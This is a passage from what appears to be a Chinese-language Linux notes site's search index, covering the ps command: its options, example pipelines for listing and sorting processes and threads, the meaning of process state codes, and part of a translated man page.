\u6bcf\u79d2\u5bf9\u4efb\u52a1\u8fdb\u884c\u7684\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u603b\u6570\u3002\u5f53\u4efb\u52a1\u7531\u4e8e\u9700\u8981\u8d44\u6e90\u4e0d\u53ef\u7528\u3002 nvcswch/s \u6bcf\u79d2\u6267\u884c\u4efb\u52a1\u7684\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u603b\u6570\u3002\u5f53\u4efb\u52a1\u5728\u5176\u65f6\u95f4\u7247\u7684\u6301\u7eed\u65f6\u95f4\u5185\u6267\u884c\uff0c\u7136\u540e\u88ab\u8feb\u653e\u5f03\u5904\u7406\u5668\u65f6\uff0c\u4f1a\u53d1\u751f\u975e\u81ea\u613f\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002 Command \u547d\u4ee4","title":"pidstat"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/","text":"ps\u547d\u4ee4 ps\u547d\u4ee4\u6765\u81ea\u4e8e\u82f1\u6587\u8bcd\u7ec4\u201dprocess status\u201c\u7684\u7f29\u5199\uff0c\u5176\u529f\u80fd\u662f\u7528\u4e8e\u663e\u793a\u5f53\u524d\u7cfb\u7edf\u7684\u8fdb\u7a0b\u72b6\u6001\u3002\u4f7f\u7528ps\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f8b\u5982\u8fdb\u7a0b\u7684\u53f7\u7801\u3001\u53d1\u8d77\u8005\u3001\u7cfb\u7edf\u8d44\u6e90\u4f7f\u7528\u5360\u6bd4\uff08\u5904\u7406\u5668\u4e0e\u5185\u5b58\uff09\u3001\u8fd0\u884c\u72b6\u6001\u7b49\u7b49\u3002\u5e2e\u52a9\u6211\u4eec\u53ca\u65f6\u7684\u53d1\u73b0\u54ea\u4e9b\u8fdb\u7a0b\u51fa\u73b0\u201d\u50f5\u6b7b\u201c\u6216\u201d\u4e0d\u53ef\u4e2d\u65ad\u201c\u7b49\u5f02\u5e38\u60c5\u51b5\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ps [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a \ufeff ps\u63a5\u53d7\u4ee5\u4e0b\u51e0\u79cd\u9009\u9879\uff1a UNIX \u9009\u9879\uff0c\u53ef\u4ee5\u5206\u7ec4\uff0c\u5e76\u4e14\u524d\u9762\u5fc5\u987b\u6709\u4e00\u4e2a\u7834\u6298\u53f7\u3002 BSD \u9009\u9879\uff0c\u53ef\u4ee5\u5206\u7ec4\uff0c\u4e0d\u80fd\u4e0e\u7834\u6298\u53f7\u4e00\u8d77\u4f7f\u7528\u3002 GNU\u957f\u9009\u9879\uff0c\u524d\u9762\u6709\u4e24\u4e2a\u7834\u6298\u53f7\u3002 \u4e0d\u540c\u7c7b\u578b\u7684\u9009\u9879\u53ef\u4ee5\u81ea\u7531\u6df7\u5408\uff0c\u4f46\u4e5f\u4f1a\u51fa\u73b0\u51b2\u7a81\u3002\u6709\u4e00\u4e9b\u540c\u4e49\u9009\u9879\u3002\u8be6\u89c1https://man7.org/linux/man-pages/man1/ps.1.html -a \u663e\u793a\u6240\u6709\u7ec8\u7aef\u673a\u4e0b\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u9664\u4e86\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u4e4b\u5916 a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u7a0b\u5e8f -A \u663e\u793a\u6240\u6709\u7a0b\u5e8f -c \u663e\u793aCLS\u548cPRI\u680f\u4f4d c \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u771f\u6b63\u7684\u6307\u4ee4\u540d\u79f0\uff0c\u800c\u4e0d\u5305\u542b\u8def\u5f84\uff0c\u9009\u9879\u6216\u5e38\u9a7b\u670d\u52a1\u7684\u6807\u793a -C <\u6307\u4ee4\u540d\u79f0> \u6307\u5b9a\u6267\u884c\u6307\u4ee4\u7684\u540d\u79f0\uff0c\u5e76\u5217\u51fa\u8be5\u6307\u4ee4\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 -d \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4f46\u4e0d\u5305\u62ec\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u7684\u7a0b\u5e8f -e \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dA\u201d\u9009\u9879\u76f8\u540c e \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u73af\u5883\u53d8\u91cf -f \u5b8c\u6574\u683c\u5f0f\u5217\u8868\u3002\u4e0e-L\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u5c06\u6dfb\u52a0NLWP\uff08\u7ebf\u7a0b\u6570\uff09\u548cLWP\uff08\u7ebf\u7a0bID\uff09\u5217 f \u7528ASCII\u5b57\u7b26\u663e\u793a\u6811\u72b6\u7ed3\u6784\uff0c\u8868\u8fbe\u7a0b\u5e8f\u95f4\u7684\u76f8\u4e92\u5173\u7cfb -F \u989d\u5916\u5b8c\u6574\u683c\u5f0f -g <\u7fa4\u7ec4\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c\uff0c\u5f53\u4ea6\u80fd\u4f7f\u7528\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u7684\u540d\u79f0\u6765\u6307\u5b9a g \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u7fa4\u7ec4\u9886\u5bfc\u8005\u7684\u7a0b\u5e8f -G <\u7fa4\u7ec4\u8bc6\u522b\u7801> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7fa4\u7ec4\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5\uff0c\u4e5f\u53ef\u4f7f\u7528\u7fa4\u7ec4\u540d\u79f0\u6765\u6307\u5b9a h \u4e0d\u663e\u793a\u6807\u9898\u5217 -H \u663e\u793a\u6811\u72b6\u7ed3\u6784\uff0c\u8868\u793a\u7a0b\u5e8f\u95f4\u7684\u76f8\u4e92\u5173\u7cfb -j\u6216j \u91c7\u7528\u5de5\u4f5c\u63a7\u5236\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -l\u6216l \u5c0f\u5199L \u56e0\u4e3aps\u6ca1\u6709-i\u6216\u8005-\u5927\u5199i\u9009\u9879 \u91c7\u7528\u8be6\u7ec6\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -L \u663e\u793a\u7ebf\u7a0b L \u5217\u51fa\u680f\u4f4d\u7684\u76f8\u5173\u4fe1\u606f -m\u6216m \u663e\u793a\u6240\u6709\u7684\u6267\u884c\u7eea n \u4ee5\u6570\u5b57\u6765\u8868\u793aUSER\u548cWCHAN\u680f\u4f4d -N \u663e\u793a\u6240\u6709\u7684\u7a0b\u5e8f\uff0c\u9664\u4e86\u6267\u884cps\u6307\u4ee4\u7ec8\u7aef\u673a\u4e0b\u7684\u7a0b\u5e8f\u4e4b\u5916 -p <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6307\u5b9a\u7a0b\u5e8f\u8bc6\u522b\u7801\uff0c\u5e76\u5217\u51fa\u8be5\u7a0b\u5e8f\u7684\u72b6\u51b5 p <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-p\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 r \u53ea\u5217\u51fa\u73b0\u884c\u7ec8\u7aef\u673a\u6b63\u5728\u6267\u884c\u4e2d\u7684\u7a0b\u5e8f -s <\u9636\u6bb5\u4f5c\u4e1a> \u6307\u5b9a\u9636\u6bb5\u4f5c\u4e1a\u7684\u7a0b\u5e8f\u8bc6\u522b\u7801\uff0c\u5e76\u5217\u51fa\u96b6\u5c5e\u8be5\u9636\u6bb5\u4f5c\u4e1a\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 s \u91c7\u7528\u7a0b\u5e8f\u4fe1\u53f7\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 S \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u5305\u62ec\u5df2\u4e2d\u65ad\u7684\u5b50\u7a0b\u5e8f\u8d44\u6599 o \u6307\u5b9a\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e-o\u548c--format\u76f8\u540c\u3002 -t <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6307\u5b9a\u7ec8\u7aef\u673a\u7f16\u53f7\uff0c\u5e76\u5217\u51fa\u5c5e\u4e8e\u8be5\u7ec8\u7aef\u673a\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 t <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-t\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 -T \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f -u <\u7528\u6237\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c u \u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -U <\u7528\u6237\u8bc6\u522b\u7801> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7528\u6237\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5\uff0c\u4e5f\u53ef\u4f7f\u7528\u7528\u6237\u540d\u79f0\u6765\u6307\u5b9a U <\u7528\u6237\u540d\u79f0> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7528\u6237\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 v \u91c7\u7528\u865a\u62df\u5185\u5b58\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -V\u6216V \u663e\u793a\u7248\u672c\u4fe1\u606f -w\u6216w \u91c7\u7528\u5bbd\u9614\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 x \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4e0d\u4ee5\u7ec8\u7aef\u673a\u6765\u533a\u5206 X \u91c7\u7528\u65e7\u5f0f\u7684Linux i386\u767b\u9646\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -y \u914d\u5408\u9009\u9879\u201d-l\u201d\u4f7f\u7528\u65f6\uff0c\u4e0d\u663e\u793aF(flag)\u680f\u4f4d\uff0c\u5e76\u4ee5RSS\u680f\u4f4d\u53d6\u4ee3ADDR\u680f\u4f4d -- <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dp\u201d\u9009\u9879\u76f8\u540c --cols <\u6bcf\u5217\u5b57\u7b26\u6570> \u8bbe\u7f6e\u6bcf\u5217\u7684\u6700\u5927\u5b57\u7b26\u6570 --columns <\u6bcf\u5217\u5b57\u7b26\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d--cols\u201d\u9009\u9879\u76f8\u540c --cumulative \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dS\u201d\u9009\u9879\u76f8\u540c --deselect \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-N\u201d\u9009\u9879\u76f8\u540c --forest \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201df\u201d\u9009\u9879\u76f8\u540c --headers \u91cd\u590d\u663e\u793a\u6807\u9898\u5217 --help \u5728\u7ebf\u5e2e\u52a9 --info \u663e\u793a\u6392\u9519\u4fe1\u606f --lines <\u663e\u793a\u5217\u6570> \u8bbe\u7f6e\u663e\u793a\u753b\u9762\u7684\u5217\u6570 --no-headers \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dh\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 --group <\u7fa4\u7ec4\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c --Group <\u7fa4\u7ec4\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c --pid <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-p\u201d\u9009\u9879\u76f8\u540c --rows <\u663e\u793a\u5217\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d--lines\u201d\u9009\u9879\u76f8\u540c --sid <\u9636\u6bb5\u4f5c\u4e1a> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-s\u201d\u9009\u9879\u76f8\u540c -tty <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-t\u201d\u9009\u9879\u76f8\u540c --user <\u7528\u6237\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c --User <\u7528\u6237\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c --version \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-V\u201d\u9009\u9879\u76f8\u540c --widty <\u6bcf\u5217\u5b57\u7b26\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-cols\u201d\u9009\u9879\u76f8\u540c \u53ea\u6253\u5370R\u548cD\u72b6\u6001\u7684\u7ebf\u7a0b $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' \u53ea\u6253\u5370R\u548cD\u72b6\u6001\u7684\u7ebf\u7a0b\u5e76\u6309\u7167\u7ebf\u7a0b\u6570\u91cf\u6392\u5e8f $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c \u6253\u5370\u6240\u6709\u7ebf\u7a0b $ ps -ALFlf #\u8fd9\u91cc\u662f\u5c0f\u5199L,ps\u6ca1\u6709-i\u6216\u8005-\u5927\u5199i\u9009\u9879 \u6253\u5370\u7ebf\u7a0b\u5360\u7528CPU\u6392\u5e8f $ ps -Leo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:30,comm | grep -v COMMAND | sort -k8nr ps aux\u7684\u89e3\u91ca ps a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u7a0b\u5e8f\u3002 ps u \u3000 \u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5\u3002 ps x \u3000 \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4e0d\u4ee5\u7ec8\u7aef\u673a\u6765\u533a\u5206\u3002 [root@tianyun ~]# ps aux |less USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 2164 648 ? Ss 08:47 0:00 init [5] \uff1f\u8868\u793a\u4e0d\u662f\u7ec8\u7aef\u542f\u52a8\u7684\u800c\u662f\u5185\u6838\u542f\u52a8\u7684\u8fdb\u7a0b USER: \u8fd0\u884c\u8fdb\u7a0b\u7684\u7528\u6237 PID\uff1a \u8fdb\u7a0bID %CPU: CPU\u5360\u7528\u7387 //1\u5206\u949f\u5360\u7528\u7387 %MEM: \u5185\u5b58\u5360\u7528\u7387 VSZ\uff1a \u5360\u7528\u865a\u62df\u5185\u5b58 RSS: \u5360\u7528\u5b9e\u9645\u5185\u5b58 \u9a7b\u7559\u5185\u5b58 TTY\uff1a \u8fdb\u7a0b\u8fd0\u884c\u7684\u7ec8\u7aef STAT\uff1a \u8fdb\u7a0b\u72b6\u6001 man ps (/STATE) START: \u8fdb\u7a0b\u7684\u542f\u52a8\u65f6\u95f4 TIME\uff1a \u8fdb\u7a0b\u5360\u7528CPU\u7684\u603b\u65f6\u95f4 COMMAND\uff1a \u8fdb\u7a0b\u6587\u4ef6\uff0c\u8fdb\u7a0b\u540d stat\u7684\u5404\u79cd\u72b6\u6001\u542b\u4e49 R \u662f Running \u6216 Runnable \u7684\u7f29\u5199\uff0c\u8868\u793a\u8fdb\u7a0b\u5728 CPU \u7684\u5c31\u7eea\u961f\u5217\u4e2d\uff0c\u6b63\u5728\u8fd0\u884c\u6216\u8005\u6b63\u5728\u7b49\u5f85\u8fd0\u884c\u3002 S \u662f Interruptible Sleep \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720\uff0c\u8868\u793a\u8fdb\u7a0b\u56e0\u4e3a\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u800c\u88ab\u7cfb\u7edf\u6302\u8d77\u3002\u5f53\u8fdb\u7a0b\u7b49\u5f85\u7684\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5b83\u4f1a\u88ab\u5524\u9192\u5e76\u8fdb\u5165 R \u72b6\u6001\u3002 D \u662f Disk Sleep \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720\uff08Uninterruptible Sleep\uff09\uff0c\u4e00\u822c\u8868\u793a\u8fdb\u7a0b\u6b63\u5728\u8ddf\u786c\u4ef6\u4ea4\u4e92\uff0c\u5e76\u4e14\u4ea4\u4e92\u8fc7\u7a0b\u4e0d\u5141\u8bb8\u88ab\u5176\u4ed6\u8fdb\u7a0b\u6216\u4e2d\u65ad\u6253\u65ad\u3002 T \u8868\u793a\u8fdb\u7a0b\u5904\u4e8e\u6682\u505c\u6216\u8005\u8ddf\u8e2a\u72b6\u6001\u3002\u5411\u4e00\u4e2a\u8fdb\u7a0b\u53d1\u9001 SIGSTOP \u4fe1\u53f7\uff0c\u5b83\u5c31\u4f1a\u56e0\u54cd\u5e94\u8fd9\u4e2a\u4fe1\u53f7\u53d8\u6210\u6682\u505c\u72b6\u6001\uff08Stopped\uff09\uff1b\u518d\u5411\u5b83\u53d1\u9001 SIGCONT \u4fe1\u53f7\uff0c\u8fdb\u7a0b\u53c8\u4f1a\u6062\u590d\u8fd0\u884c\uff08\u5982\u679c\u8fdb\u7a0b\u662f\u7ec8\u7aef\u91cc\u76f4\u63a5\u542f\u52a8\u7684\uff0c\u5219\u9700\u8981\u4f60\u7528 fg \u547d\u4ee4\uff0c\u6062\u590d\u5230\u524d\u53f0\u8fd0\u884c\uff09\u3002 Z \u662f Zombie \u7684\u7f29\u5199\uff0c\u5982\u679c\u4f60\u73a9\u8fc7\u201c\u690d\u7269\u5927\u6218\u50f5\u5c38\u201d\u8fd9\u6b3e\u6e38\u620f\uff0c\u5e94\u8be5\u77e5\u9053\u5b83\u7684\u610f\u601d\u3002\u5b83\u8868\u793a\u50f5\u5c38\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b\u5b9e\u9645\u4e0a\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u4f46\u662f\u7236\u8fdb\u7a0b\u8fd8\u6ca1\u6709\u56de\u6536\u5b83\u7684\u8d44\u6e90\uff08\u6bd4\u5982\u8fdb\u7a0b\u7684\u63cf\u8ff0\u7b26\u3001PID \u7b49\uff09\u3002 //\u4e0d\u80fd\u6709\u592a\u591a\uff0c\u6709\u592a\u591a\u5c31\u4e0d\u6b63\u5e38\u7684 I \u662f Idle \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u7a7a\u95f2\u72b6\u6001\uff0c\u7528\u5728\u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\u7684\u5185\u6838\u7ebf\u7a0b\u4e0a\u3002\u524d\u9762\u8bf4\u4e86\uff0c\u786c\u4ef6\u4ea4\u4e92\u5bfc\u81f4\u7684\u4e0d\u53ef\u4e2d\u65ad\u8fdb\u7a0b\u7528 D \u8868\u793a\uff0c\u4f46\u5bf9\u67d0\u4e9b\u5185\u6838\u7ebf\u7a0b\u6765\u8bf4\uff0c\u5b83\u4eec\u6709\u53ef\u80fd\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4efb\u4f55\u8d1f\u8f7d\uff0c\u7528 Idle \u6b63\u662f\u4e3a\u4e86\u533a\u5206\u8fd9\u79cd\u60c5\u51b5\u3002\u8981\u6ce8\u610f\uff0cD \u72b6\u6001\u7684\u8fdb\u7a0b\u4f1a\u5bfc\u81f4\u5e73\u5747\u8d1f\u8f7d\u5347\u9ad8\uff0c I \u72b6\u6001\u7684\u8fdb\u7a0b\u5374\u4e0d\u4f1a\u3002 X \u6b7b\u6389\u7684\u8fdb\u7a0b Ss s\u8fdb\u7a0b\u7684\u9886\u5bfc\u8005\uff0c\u7236\u8fdb\u7a0b S< <\u4f18\u5148\u7ea7\u8f83\u9ad8\u7684\u8fdb\u7a0b SN N\u4f18\u5148\u7ea7\u8f83\u4f4e\u7684\u8fdb\u7a0b R+ +\u8868\u793a\u662f\u524d\u53f0\u7684\u8fdb\u7a0b\u7ec4 Sl \u4ee5\u7ebf\u7a0b\u7684\u65b9\u5f0f\u8fd0\u884c \u6392\u5e8f \u81ea\u5b9a\u4e49\u683c\u5f0f\u6392\u5e8f $ ps -eo pid,user,args --sort user \u6309\u7167\u6807\u9898\u8fdb\u884c\u6392\u5e8f\uff08\u5df2\u5931\u6548\uff0c\u539f\u56e0\u53c2\u89c1\u4e0b\u9762\u7684man\u624b\u518c\u4e2d\u6587\u7ffb\u8bd1\uff09 $ ps aux --sort %cpu //\u4ece\u4f4e\u5f80\u9ad8\u6392\u5e8f $ ps aux --sort -%cpu //\u4ece\u9ad8\u5f80\u4f4e\u6392\u5e8f $ ps aux --sort rss $ ps aux --sort -rss $ ps aux --sort %mem $ ps aux --sort -%mem \u624b\u52a8\u6392\u5e8f \u4f7f\u7528\u5185\u5b58\u524d10 $ ps aux | sort -k4nr | head -n 10 \u4f7f\u7528CPU\u524d10 $ ps aux | sort -k3nr | head -n 10 Note \u6bd4\u5982\u8bf4sort -k 1 -k 2 test.txt\uff0c\u90a3\u4e48\u5c31\u4f1a\u6839\u636etest.txt\u6587\u4ef6\u4e2d\u7684\u7b2c\u4e00\u5217\u548c\u7b2c\u4e8c\u5217\u8fdb\u884c\u6392\u5e8f\u3002 -n\uff1a\u4f9d\u7167\u6570\u503c\u7684\u5927\u5c0f\u6392\u5e8f\uff1b -r\uff1a\u4ee5\u76f8\u53cd\u7684\u987a\u5e8f\u6765\u6392\u5e8f PS(1) \u7528\u6237\u547d\u4ee4 PS(1) \u540d\u79f0 ps - \u62a5\u544a\u5f53\u524d\u8fdb\u7a0b\u7684\u5feb\u7167\u3002 \u6982\u8981 ps [\u9009\u9879] \u63cf\u8ff0 ps \u663e\u793a\u9009\u5b9a\u7684\u6d3b\u52a8\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u5982\u679c\u60a8\u5e0c\u671b\u5bf9\u9009\u5b9a\u7684\u4fe1\u606f\u8fdb\u884c\u91cd\u590d\u66f4\u65b0\uff0c\u8bf7\u4f7f\u7528 top\u3002 \u8be5\u7248\u672c\u7684 ps \u63a5\u53d7\u51e0\u79cd\u7c7b\u578b\u7684\u9009\u9879\uff1a 1 UNIX \u9009\u9879\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\uff0c\u5e76\u4e14\u5fc5\u987b\u4ee5\u7834\u6298\u53f7\u4e3a\u524d\u7f00\u3002 2 BSD \u9009\u9879\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\uff0c\u4e0d\u5e94\u4f7f\u7528\u7834\u6298\u53f7\u3002 3 GNU \u957f\u9009\u9879\uff0c\u4ee5\u4e24\u4e2a\u7834\u6298\u53f7\u4e3a\u524d\u7f00\u3002 \u53ef\u4ee5\u81ea\u7531\u6df7\u5408\u4f7f\u7528\u4e0d\u540c\u7c7b\u578b\u7684\u9009\u9879\uff0c\u4f46\u53ef\u80fd\u4f1a\u51fa\u73b0\u51b2\u7a81\u3002\u7531\u4e8e\u6b64 ps \u517c\u5bb9\u591a\u4e2a\u6807\u51c6\u548c ps \u5b9e\u73b0\uff0c \u56e0\u6b64\u5b58\u5728\u4e00\u4e9b\u529f\u80fd\u4e0a\u76f8\u540c\u7684\u540c\u4e49\u9009\u9879\u3002 \u8bf7\u6ce8\u610f\uff0cps -aux \u4e0e ps aux \u662f\u4e0d\u540c\u7684\u3002POSIX \u548c UNIX \u6807\u51c6\u8981\u6c42 ps -aux \u6253\u5370\u51fa\u6240\u6709\u7531\u540d\u4e3a x \u7684\u7528\u6237\u62e5\u6709\u7684\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u6240\u6709\u7531 -a \u9009\u9879\u9009\u62e9\u7684\u8fdb\u7a0b\u3002\u5982\u679c\u7528\u6237 x \u4e0d\u5b58\u5728\uff0c\u5219\u6b64 ps \u53ef\u80fd\u4f1a\u5c06 \u547d\u4ee4\u89e3\u91ca\u4e3a ps aux\uff0c\u5e76\u6253\u5370\u8b66\u544a\u3002\u6b64\u884c\u4e3a\u65e8\u5728\u5e2e\u52a9\u8fc7\u6e21\u65e7\u811a\u672c\u548c\u4e60\u60ef\u3002\u5b83\u662f\u8106\u5f31\u7684\uff0c\u53ef\u80fd\u4f1a \u66f4\u6539\uff0c\u56e0\u6b64\u4e0d\u5e94\u4f9d\u8d56\u6b64\u884c\u4e3a\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cps \u9009\u62e9\u6240\u6709\u4e0e\u5f53\u524d\u7528\u6237\u62e5\u6709\u76f8\u540c\u6709\u6548\u7528\u6237 ID (euid=EUID) \u5e76\u4e0e\u8c03\u7528\u8005\u5173\u8054\u7684 \u7ec8\u7aef\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\u3002\u5b83\u663e\u793a\u8fdb\u7a0b ID (pid=PID)\uff0c\u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u7ec8\u7aef (tname=TTY)\uff0c\u4ee5 [DD-]hh:mm:ss \u683c\u5f0f\u7d2f\u8ba1\u7684 CPU \u65f6\u95f4 (time=TIME) \u548c\u53ef\u6267\u884c\u6587\u4ef6\u540d (ucmd=CMD)\u3002\u8f93\u51fa\u9ed8\u8ba4 \u60c5\u51b5\u4e0b\u672a\u6392\u5e8f\u3002 \u4f7f\u7528 BSD \u98ce\u683c\u7684\u9009\u9879\u5c06\u6dfb\u52a0\u8fdb\u7a0b\u72b6\u6001 (stat=STAT) \u5230\u9ed8\u8ba4\u663e\u793a\uff0c\u5e76\u663e\u793a\u547d\u4ee4\u53c2\u6570 (args=COMMAND) \u800c\u4e0d\u662f\u53ef\u6267\u884c\u6587\u4ef6\u540d\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7 PS_FORMAT \u73af\u5883\u53d8\u91cf\u8986\u76d6\u6b64\u8bbe\u7f6e\u3002\u4f7f\u7528 BSD \u98ce\u683c\u7684\u9009\u9879\u8fd8\u5c06 \u66f4\u6539\u8fdb\u7a0b\u9009\u62e9\uff0c\u4ee5\u5305\u62ec\u7531\u60a8\u62e5\u6709\u7684\u5176\u4ed6\u7ec8\u7aef (TTYs) \u4e0a\u7684\u8fdb\u7a0b\uff1b\u6216\u8005\uff0c\u53ef\u4ee5\u5c06\u5176\u63cf\u8ff0\u4e3a\u5c06\u9009\u62e9 \u8bbe\u7f6e\u4e3a\u6240\u6709\u8fdb\u7a0b\u7684\u96c6\u5408\uff0c\u8fc7\u6ee4\u6389\u7531\u5176\u4ed6\u7528\u6237\u62e5\u6709\u7684\u8fdb\u7a0b\u6216\u4e0d\u5728\u7ec8\u7aef\u4e0a\u7684\u8fdb\u7a0b\u3002\u8fd9\u4e9b\u6548\u679c\u5728\u4e0b\u6587 \u63cf\u8ff0\u9009\u9879\u65f6\u4e0d\u88ab\u89c6\u4e3a\u201c\u76f8\u540c\u201d\uff0c\u56e0\u6b64 -M \u5c06\u88ab\u89c6\u4e3a\u4e0e Z \u7b49\u6548\u3002 